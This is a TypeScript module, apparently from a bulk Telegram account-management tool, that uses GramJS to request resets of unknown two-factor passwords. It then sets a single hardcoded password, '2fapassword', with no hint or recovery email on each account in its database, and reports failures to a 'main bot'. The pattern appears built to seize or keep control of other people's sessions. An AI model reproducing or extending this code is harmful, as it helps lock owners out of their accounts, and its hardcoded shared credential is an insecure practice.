import TelegramClient from '../../../gramjs/client/TelegramClient';
import { generateRandomBytes } from '../../../gramjs/Helpers';
import { computeDigest } from '../../../gramjs/Password';
import GramJs from '../../../gramjs/tl/api';
import { Account } from '../../@types/Account';
import { updateAccountById } from '../../db/accounts';
import { sendToMainBot } from '../../helpers/sendToMainBot';
import { invokeRequest } from '../../modules/invokeRequest';

const twoFaPassword = '2fapassword';
export const setup2FA = async (client: TelegramClient, account: Account) => {
  try {
    const { twoFa, unknownTwoFa } = account;
    if (twoFa) {
      return;
    }

    const resetPassword = await invokeRequest(
      client,
      new GramJs.account.ResetPassword()
    );

    if (resetPassword instanceof GramJs.account.ResetPasswordOk) {
      throw new Error('PASSWORD_EMPTY');
    }

    if (!unknownTwoFa) {
      await updateAccountById(client._accountId, {
        unknownTwoFa: true,
      });
    }
  } catch (e: any) {
    if (e.message === 'PASSWORD_EMPTY') {
      const pwd = await invokeRequest(client, new GramJs.account.GetPassword());
      if (!pwd) {
        throw new Error('PWD_EMPTY');
      }

      if (!(pwd.newAlgo instanceof GramJs.PasswordKdfAlgoUnknown)) {
        pwd.newAlgo.salt1 = Buffer.concat([
          pwd.newAlgo.salt1,
          generateRandomBytes(32),
        ]);
      }

      try {
        const newPasswordHash = await computeDigest(pwd.newAlgo, twoFaPassword);
        const passwordSettings = await invokeRequest(
          client,
          new GramJs.account.UpdatePasswordSettings({
            password: new GramJs.InputCheckPasswordEmpty(),
            newSettings: new GramJs.account.PasswordInputSettings({
              newAlgo: pwd.newAlgo,
              newPasswordHash,
              hint: '',
              email: undefined,
              newSecureSettings: undefined,
            }),
          })
        );

        if (!passwordSettings) {
          throw new Error('PASSWORD_SETTINGS_EMPTY');
        }

        await updateAccountById(client._accountId, {
          unknownTwoFa: false,
          twoFa: true,
        });
      } catch (e: any) {
        await sendToMainBot(
          `💀 ERROR_SETTING_UP_2FA 💀
ID: ${client._accountId}
ERROR: ${e.message}`
        );
      }
    } else {
      await sendToMainBot(
        `💀 ERROR_SETTING_UP_2FA_PASSWORD 💀
ID: ${client._accountId}
ERROR: ${e.message}`
      );
    }
  }
};
